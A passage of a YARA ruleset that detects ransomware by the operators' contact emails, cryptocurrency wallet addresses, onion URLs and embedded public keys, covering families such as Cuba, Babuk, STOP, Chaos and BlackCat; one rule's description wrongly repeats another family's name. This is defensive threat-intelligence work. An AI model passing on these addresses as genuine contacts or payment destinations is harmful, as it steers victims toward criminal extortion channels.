		description = "Detects files referencing identities associated with Purge ransomware"
		author = "ditekShen"
		id = "2a0f2c69-b179-5e48-9db6-be25e329f72b"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L215-L224"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "49f3f5a88212d4bed1f0237a4437fb537e84cd6dd26c5fe224250f3b6e39d384"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "rscl@dr.com" ascii wide nocase
		$s2 = "rscl@usa.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Zeoticus
{
	meta:
		description = "Detects files referencing identities associated with Zeoticus ransomware"
		author = "ditekShen"
		id = "4d5f0d6d-f792-563d-9a9b-1986f5af8743"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L226-L235"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "7a83b15b0c8e81f67d11f8b5d9a43ba4e1e3a0f6741ddd0daafe4e742dd91cd8"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "anobtanium@tutanota.com" ascii wide nocase
		$s2 = "anobtanium@cock.li" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Jobcryptor
{
	meta:
		description = "Detects files referencing identities associated with JobCryptor ransomware"
		author = "ditekShen"
		id = "406f5638-883b-57a4-a2ba-532d2bd3ae83"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L237-L247"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "c8c5dcc0d7484a3ac6e702cca8bd0907f9e4f4aea5e99c4c3f988389e0d803a7"
		score = 75
		quality = 69
		tags = ""

	strings:
		$s1 = "olaggoune235@protonmail.ch" ascii wide nocase
		$s2 = "ouardia11@tutanota.com" ascii wide nocase
		$s3 = "laggouneo11@gmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Cuba
{
	meta:
		description = "Detects files referencing identities associated with JobCryptor ransomware"
		author = "ditekShen"
		id = "5eea027d-2164-54f2-a2bf-74b5d532e610"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L249-L261"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "b734199c8593c338c803518b2729e9d9ceaaed5d21585a3d299885433d8f796e"
		score = 75
		quality = 65
		tags = ""

	strings:
		$s1 = "helpadmin2@protonmail.com" ascii wide nocase
		$s2 = "helpadmin2@cock.li" ascii wide nocase
		$s3 = "mfra@cock.li" ascii wide nocase
		$s4 = "admin@cuba-supp.com" ascii wide nocase
		$s5 = "cuba_support@exploit.im" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Hello
{
	meta:
		description = "Detects files referencing identities associated with Hello / WickrMe ransomware"
		author = "ditekShen"
		id = "02bbaa61-7ea3-5edd-8b38-27ef1f6ee1e2"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L263-L277"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "dfafb0323a50891c03c4b706d4f3a6a511cecdee2448c1f554b416ba1e3d3df9"
		score = 75
		quality = 61
		tags = ""

	strings:
		$s1 = "emming@tutanota.com" ascii wide nocase
		$s2 = "ampbel@protonmail.com" ascii wide nocase
		$s3 = "asauribe@tutanota.com" ascii wide nocase
		$s4 = "candietodd@tutanota.com" ascii wide nocase
		$s5 = "kellyreiff@tutanota.com" ascii wide nocase
		$s6 = "kevindeloach@protonmail.com" ascii wide nocase
		$s7 = "sheilabeasley@tutanota.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Unlockyourfiles
{
	meta:
		description = "Detects files referencing identities associated with UnlockYourFiles ransomware"
		author = "ditekShen"
		id = "fdc3ec49-66cc-5a0b-87a6-3660dd6f3b72"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L279-L288"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "a33dae7f08eb0c2415fbfdadf2cbbf90c68bc802352277422c6d0a2dbd62cd82"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "4lok3r@tutanota.com" ascii wide nocase
		$s2 = "4lok3r@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Darkside
{
	meta:
		description = "Detects files referencing identities associated with DarkSide ransomware"
		author = "ditekShen"
		id = "7b29b9b9-4657-551e-b770-880a2278ef60"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L290-L299"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "3c6cdb15cad19f1db38c0fe03ecb24d5cd4861a699aa2bee0f99b8dddacc8bd1"
		score = 75
		quality = 73
		tags = ""
		hash1 = "bafa2efff234303166d663f967037dae43701e7d63d914efc8c894b3e5be9408"

	strings:
		$s1 = "breathcojunktab1987@yahoo.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Spyro
{
	meta:
		description = "Detects files referencing identities associated with Spyro ransomware"
		author = "ditekShen"
		id = "9a42a9fd-dfaf-5719-acae-e7c3b92ecdc9"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L301-L310"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "b12b24b7b1b9800d249fd322532d957ddfc020c495ca89414d8d7e9fa7d58eb7"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "blackspyro@tutanota.com" ascii wide nocase
		$s2 = "blackspyro@mailfence.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Ryzerlo
{
	meta:
		description = "Detects files referencing identities associated with Ryzerlo / HiddenTear / RSJON ransomware"
		author = "ditekShen"
		id = "1e8b79dc-4a81-5126-a7a3-ad7a2e8f62bf"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L312-L320"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "2d925cac74411c3e408d674e27a27ae029d39977026a79df8f90edae345a31db"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "darkjon@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_PYSA
{
	meta:
		description = "Detects files referencing identities associated with PYSA / Mespinoza ransomware"
		author = "ditekShen"
		id = "b26d472b-c94e-576d-b168-6f273bb8fca5"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L322-L340"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "cf0fbc0160f1d21efdb4a6935ae0d2206107042e3d020722f50d2c302aff246c"
		score = 75
		quality = 55
		tags = ""

	strings:
		$s1 = "luebegg8024@onionmail.org" ascii wide nocase
		$s2 = "mayakinggw3732@onionmail.org" ascii wide nocase
		$s3 = "lauriabornhat7722@protonmail.com" ascii wide nocase
		$s4 = "DeborahTrask@onionmail.org" ascii wide nocase
		$s5 = "AlisonRobles@onionmail.org" ascii wide nocase
		$s6 = "NatanSchultz67@protonmail.com" ascii wide nocase
		$s7 = "jonikemppi@onionmail.org" ascii wide nocase
		$s8 = "lanerosalie49003@onionmail.org" ascii wide nocase
		$s9 = "bernalmargaret645@onionmail.org" ascii wide nocase
		$s10 = "carlhubbard2021@protonmail.com" ascii wide nocase
		$u1 = "http://pysa2bitc" ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Ranzylocker
{
	meta:
		description = "Detects files referencing identities associated with RanzyLocker ransomware"
		author = "ditekShen"
		id = "33478dc4-c0ec-5cc8-8620-79e770f6a773"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L354-L363"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "dc345257a3cca82a95e20505c94e90d8ac42240e1491ea1f34be121871673e26"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "eviluser@tutanota.com" ascii wide nocase
		$s2 = "evilpr0ton@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Alkhal
{
	meta:
		description = "Detects files referencing identities associated with AlKhal ransomware"
		author = "ditekShen"
		id = "32e14a6e-fc2e-5c0a-b8e3-33e219923d90"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L365-L374"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "bd2d66a9cd33ab15b451158cd6c0e6579735653611ee2e6c8045a5807091938d"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "alkhal@tutanota.com" ascii wide nocase
		$s2 = "cyrilga@tutanota.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_DECAF
{
	meta:
		description = "Detects files referencing identities associated with DECAF ransomware"
		author = "ditekShen"
		id = "24422015-56f3-503e-a902-0183eb601b22"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L376-L408"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "8fca3a6564cd11e625b65e7f0f278b79678368dd0c77440e9f8d46035e0c3426"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "22eb687475f2c5ca30b@protonmail.com" ascii wide nocase
		$s2 = { 4d 49 49 42 43 67 4b 43 41 51 45 41 71 34 6b 31
                48 64 62 31 54 48 72 7a 42 42 65 4f 31 38 34 6b
                6e 43 62 42 4b 72 30 33 61 70 66 58 71 6c 4f 6b
                53 64 74 48 53 4a 67 66 79 49 71 4a 50 47 78 6c
                0a 2f 63 46 69 73 4a 6d 56 58 52 33 2f 74 34 65
                39 46 62 4c 73 45 49 75 54 70 39 50 4a 54 63 69
                6f 6d 48 66 72 35 43 67 43 51 7a 68 6e 41 5a 30
                41 76 6a 47 42 61 57 50 36 4b 70 43 79 66 44 6e
                73 0a 79 62 72 75 79 4b 71 79 67 61 57 70 5a 53
                41 6e 7a 52 64 42 2b 54 41 6b 75 35 69 71 79 38
                71 31 56 77 6e 4e 35 37 51 42 6c 74 72 6f 30 59
                4a 5a 38 65 6e 4b 5a 52 54 6c 63 7a 6d 74 6a 65
                4f 70 0a 42 2f 78 75 54 4f 75 44 6a 6d 55 53 4e
                69 47 79 69 6a 57 42 56 66 59 6b 37 73 56 58 6c
                2f 6c 51 38 74 61 58 72 33 36 78 50 57 68 4d 49
                47 30 45 71 52 56 72 46 56 2b 63 61 76 53 37 5a
                34 76 61 0a 79 58 6d 63 66 35 35 4e 6b 70 4d 47
                4b 4b 59 38 75 71 76 77 62 34 61 4c 49 4b 61 62
                65 6b 32 6e 55 57 42 67 4e 67 53 4f 74 71 42 4c
                4c 4c 32 41 32 62 59 2f 35 73 30 47 4a 2f 56 56
                2b 45 6d 49 0a 58 37 2f 7a 49 2b 46 63 65 55 2b
                64 63 4e 58 2f 69 72 30 75 6a 50 34 79 73 34 6d
                2f 6a 6a 5a 44 34 77 49 44 41 51 41 42 }

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Babuk
{
	meta:
		description = "Detects files referencing identities associated with Babuk ransomware"
		author = "ditekShen"
		id = "139cea69-9661-5cb7-bf74-a14e3556c759"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L410-L426"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "129b1364bb59423aab1f5f67a4c2d2a76a9c4f55aa6aa1e59bcebc717a14ee19"
		score = 75
		quality = 61
		tags = ""

	strings:
		$s1 = "mitnickd@ctemplar.com" ascii wide nocase
		$s2 = "zar8b@tuta.io" ascii wide nocase
		$s3 = "recover300dollars@gmail.com" ascii wide nocase
		$s4 = "support.3330@gmail.com" ascii wide nocase
		$s5 = "decryptdelta@gmail.com" ascii wide nocase
		$s6 = "pyotrmaksim@gmail.com" ascii wide nocase
		$s7 = "retrievedata300@gmail.com" ascii wide nocase
		$s8 = "3JG36KY6abZTnHBdQCon1hheC3Wa2bdyqs" ascii wide
		$s9 = "46zdZVRjm9XJhdjpipwtYDY51NKbD74bfEffxmbqPjwH6efTYrtvbU5Et4AKCre9MeiqtiR51Lvg2X8dXv1tP7nxLaEHKKQ" ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Rapid
{
	meta:
		description = "Detects files referencing identities associated with Rapid ransomware"
		author = "ditekShen"
		id = "a1c6f3c0-2fec-5d96-9965-8129a843ae90"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L428-L436"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "ea82a3fcb1d836e1c250e9a576064e1babdb82b4970555260af2eb68726cfd16"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "jimmyneytron@tuta.io" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Satana
{
	meta:
		description = "Detects files referencing identities associated with Satana ransomware"
		author = "ditekShen"
		id = "a362d4ca-d475-5392-a3ac-45337425d8e7"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L438-L447"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "6d82e2497044518cee1b56da85f1ad6ac7934eec9ca68501932d55add4236d45"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "adamadam@ausi.com" ascii wide nocase
		$s2 = "XsrR2he2Z8un5ysGWnJ1wveZRPRS96XEoX" ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Zeppelin
{
	meta:
		description = "Detects files referencing identities associated with Zeppelin ransomware"
		author = "ditekShen"
		id = "f3bbfcd0-c66c-589e-ae04-904314d6a869"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L449-L462"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "66dd92423cfac32de4bea95ad0c9594cb449dc897cc6315d782c1db6de7dc5b1"
		score = 75
		quality = 63
		tags = ""

	strings:
		$s1 = "kd8eby0@inboxhub.net" ascii wide nocase
		$s2 = "kd8eby0@onionmail.org" ascii wide nocase
		$s3 = "kd8eby0@nuke.africa" ascii wide nocase
		$s4 = "uspex1@cock.li" ascii wide nocase
		$s5 = "uspex2@cock.li" ascii wide nocase
		$s6 = "China.Helper@aol.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_STOP
{
	meta:
		description = "Detects files referencing identities associated with STOP ransomware"
		author = "ditekShen"
		id = "b2279a7f-a187-5a44-bf1f-87c21b3ffa4f"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L464-L480"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "f0d902edbcbe8ff8f3a751b649554499933b06471920c86a9eea3de23890b4bc"
		score = 75
		quality = 57
		tags = ""

	strings:
		$s1 = "gorentos@bitmessage.ch" ascii wide nocase
		$s2 = "gorentos2@firemail.cc" ascii wide nocase
		$s3 = "manager@mailtemp.ch" ascii wide nocase
		$s4 = "helprestoremanager@airmail.cc" ascii wide nocase
		$s5 = "supporthelp@airmail.cc" ascii wide nocase
		$s6 = "managerhelper@airmail.cc" ascii wide nocase
		$s7 = "helpteam@mail.ch" ascii wide nocase
		$s8 = "helpmanager@airmail.cc" ascii wide nocase
		$s9 = "support@sysmail.ch" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Diavol
{
	meta:
		description = "Detects files referencing identities associated with Diavol ransomware"
		author = "ditekShen"
		id = "ea499318-ed5b-5597-8f9f-4ece7942cf4b"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L482-L491"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "c72f4d7854f7ba813c4872d47aad69edb8c2927f380b9213ced1aca52454eee5"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "/noino.5fws6uqv5byttg2r//:sptth" ascii wide nocase
		$s2 = "https://r2gttyb5vqu6swf5.onion/" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Chaos
{
	meta:
		description = "Detects files referencing identities associated with Chaos ransomware"
		author = "ditekShen"
		id = "18476655-1468-569e-b518-ebeaf289fbd6"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L493-L511"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "6e8dce1622dbccca6aa15040b49fc9ea05ec7192f8a79409fd7414690102d09a"
		score = 75
		quality = 67
		tags = ""

	strings:
		$s1 = "anenomous31@gmail.com" ascii wide nocase
		$s2 = "daengsocietyteam@gmail.com" ascii wide nocase
		$s3 = "RansHelp@tutanota.com" ascii wide nocase
		$s4 = "18vhBpgPhZrjJkbuT2ZyUXAnJavaJcTwEd" ascii wide
		$s5 = "bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0" ascii wide
		$s6 = "8AFtPnreZp28xoetUyKiQvVtwrov9PtEbMyvczdNZpBN45EUbEsrE8xYVp4NNqPrtxNjQwn3PbW3FG16EPYcPpKzMU78xN6" ascii wide
		$s7 = "bc1qu6tharwawwny28z9fj6nrxg5cqftaep9ap6z2v" ascii wide
		$s8 = "bambolina2021@virgilio.it" ascii wide nocase
		$s9 = "1EoyuvcXdAQQvStkoJZ38vdGm84StD7wjm" ascii wide
		$s10 = "1G395PJs8ciqvXPZEYb1LfUGPix9h9n3oQ" ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Maze
{
	meta:
		description = "Detects files referencing identities associated with Maze ransomware"
		author = "ditekShen"
		id = "7cc11912-e5d2-5477-ab9b-0c470bb5e1d6"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L513-L521"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "46070d46c502837e5fb87d0fb75244a1a21e90b4e0ce4b73c408b8dc67fe1bcb"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "getmyfilesback@airmail.cc" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Lokilocker
{
	meta:
		description = "Detects files referencing identities associated with LokiLocker ransomware"
		author = "ditekShen"
		id = "ab2cf390-4544-54ed-913c-d463d0f1bdb0"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L523-L531"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "1ab9a2ce7e39d916b389e2adb975e3558ddb7d87f7e9494e6b20cb25edd3cb84"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "Unlockpls.dr01@yahoo.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Blackcat
{
	meta:
		description = "Detects files referencing identities associated with BlackCat ransomware"
		author = "ditekShen"
		id = "21038f8e-73cd-59d2-9eb3-6947d263ab79"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L533-L569"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "eb0a4d26170f030775f778cc524749ca283dfa983f84bd364e4df6321eb96cf1"
		score = 75
		quality = 73
		tags = ""

	strings:
		$pk1 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0B0ni9tyKHSJmU6gc1iRwNTklYocRKmLPUyOthUIHnZHwL1M2pKlMBwXx81bboVS6Cf8YaCoWW1bCmLwPX421sG22xkmtMy/SfiG8jaYtYiA7r7hOdIUnJgRo6vDvNafZlSD32tFVVjuX8Ec79qj2FM7/MmNcseUgpIQaEACuZcSzMK+jZA4BLT9b5Akkec2hPOXGTPmgaXjL9EJE+0rhNZcm/m6xe4/S5eL2kSCVsNUeG8xWuSO2kDRS8xY3rtJOCNEdqZp1rxzTkhgj3hHqr7AoFAkxNblQ538JcdF5+CGINxckA/ldmP7wQd92tmFk2vcl2WeQykFwMM6L6MsQwIDAQAB" ascii wide
		$pk2 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA49gzJwP9UwEuYQZT1cdgSpxG6z8TVNLPfS4Qwd3vpWHEOAuvi8JGVEpHPGZnrD1QFoDLSTva3PZ4mqtIVO79GOYb5uQkP7LdJGWbLAjUGptVGmB67jKOOLLrjmuBDHpJXSOGG/vw5vajr4MhNnsvoBLPOC0AOzPM6GBDgKdC9zdUGNEreAjOR4neqwZ2jfYl5k5e3eRF86hmWhGXJQaU1uTmDJwgQIzmUZKo+YCfAHbEbSA4HhsumJfw0MJN7RfKPEQkEVvRIBibHnJuIp1bxk3IGPzTCbyQLHMVLz8wgElEexu8/aO3FT6w4uPY3qD+r2W+ri7xIdEN/pTz6TBKvwIDAQAB" ascii wide
		$pk3 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA8tKPNFCbU5Unr9jxlTk4RmUdVhcRydJFts6hMpLzcAXIR2yxiNC0QiF4UovAIpGwX6kxOW7kOaOvABJQP6QENMNSg030VlLoTP+ndfFwIt+X+RUflG4UWPE8yu+kzGpCwp7UjX+hD/SpFbSFRRh3BvL3vEq04DzE0AzifEBE4yxKpLsrMsXyZzWy9Nza8NTO2jrBxoEVM2xCLkULp0wZEPDwgeKGkoxMzqavVWBC+Vxi0atKstbo7/TloNenPagl/eUErk9C8tT67zKgbEh3TFtREgaxa/yrjBvN48BU8JGGxLxy4AeGF0vOUdD0WkJsWYzLVg21ApgJaCDr5zDPuQIDAQAB" ascii wide
		$pk4 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApw3tWdMaWJvNf2Mejy5H0Y6kuj+lstNpwFyismGDEYhWKPps9c68xl+84o6uLKfqPzNvLnSxlVa6DitcJGeKJEQkzN+C1e1KsfzM63jHybREB2hs+dHbqBq4dbamIQcTrrr4mKzuHJ7aok4mlpRx2Un1XOJaodoV7xOHO7ui5v6uK39MJ3rvitSEBvv5oI0WDlp3IFmtd6UM6r2nygY1ncAUuasalZgF1Vaz7VXOWyX2ReQHbYWWRCR1qyKMQcBtjT5POXx9B8ek1pnU4p65kGe9M794Bhhh20GN24gY5a+zwXwstaNTO9luwd4xjjRQAVsDgjrjkzti27G11ICn6wIDAQAB" ascii wide
		$pk5 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAq8kj5LQJngPsY7AhTaJsUXc5FrSGeKS5gw5PIqk2QPM9TY6+us8TRRzWZ7rGk1zns2klpzpRMUzLIqB8lpCkJjqkOUGfgqs+HN4VIOpoJgFY897xstJCxTc+8pYQEsSqClxJllscU0okkLSQqndIR2Gznlg3qfcwyncJAFBInyqM+L4kbwCQZ6x5HNiLe2lJn8RP2aDiMI+RS1uLYron2G7rxDTUQnxThMtgLAeko8ulaB3TpB0g4lmHCenkEZeBNs81986+MjHnv7KkiscZ7ZrezKjNaIxRs8BAcD9y+Q9QQxCvZMS01ITNXcgiItbA4dsGq1fPJ42yBkkiIodsEQIDAQAB" ascii wide
		$pk6 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqEoytNrMZRoqyIsFpcjiqVWpuV+cC9jS1umXNg/AnJF/xE7LONAmb1p8Dsx1igIUd65IXfFUxmJjFO5hf8LIBzvjUbBll4lbSgGTAUHa3Jbmr/imle6QftmY32J7dDb4WuJUOx+vLNT0I72CESiyotSzwgvLwjyubTmzTJMkqviYOcgDj45NVOx669cG6FWEaJo3PUZzRx9LS6pkOn8tW+W4NzmHMcrma+LOakan7NU6Khv5Hf5ARNsAA+KvDfP1WXJ/VsLXj6x8SdX0v2iS+y58ehUUmlxc8HNsYdOGFwrwYX9zLyJDedsbPg02c4AE4KXt8vH4+j4lVFtruSy4vwIDAQAB" ascii wide
